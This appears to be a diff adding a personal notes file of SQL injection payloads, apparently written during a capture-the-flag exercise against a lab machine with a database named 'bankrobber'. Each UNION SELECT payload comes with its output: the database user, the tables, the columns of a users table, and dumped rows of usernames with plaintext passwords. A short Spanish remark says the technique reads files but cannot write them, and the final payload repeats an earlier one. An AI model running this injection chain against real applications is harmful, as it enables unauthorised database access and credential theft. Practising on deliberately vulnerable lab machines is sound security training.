@@ -1,0 +1,19 @@
+// current user
+-1' union select 1,user(),'1
+root@localhost
+// current database
+-1' union select 1,database(),'1
+bankrobber
+// database tables
+-1' union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database()-- -
+balance,hold,users
+// columns of table users
+-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'-- -
+id,username,password
+// rows of table users
+-1' union select 1,group_concat(id,'|',username,'|',password),1 from users-- -
+1|admin|Hopelessromantic,2|gio|gio,3|noob|noob
+
+para ver archivos pero no escribirlos
+
+-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='users'-- -
